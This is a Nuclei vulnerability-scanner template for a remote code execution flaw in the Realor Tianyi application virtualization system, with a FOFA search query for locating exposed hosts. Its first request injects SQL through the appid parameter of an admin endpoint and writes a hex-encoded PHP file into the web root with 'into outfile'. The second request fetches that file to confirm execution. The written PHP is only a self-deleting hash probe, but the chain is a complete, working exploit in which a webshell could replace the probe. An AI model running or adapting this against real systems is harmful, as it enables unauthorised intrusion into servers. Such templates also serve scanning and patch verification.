id: RYTY-RCE

info:
  name: 瑞友天翼应用虚拟化系统-RCE
  author: HackTwo
  severity: high
  metadata:
    fofa-query:  app="REALOR-天翼应用虚拟化系统"
http:
  - raw:
      - |
        GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f706870206563686f206d6435282736363627293b756e6c696e6b285f5f46494c455f5f293b3f3e%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cceshi.xgi%27%23 HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

      - |
        GET /ceshi.xgi HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"0b27c451c728867a567e8c1bb4e")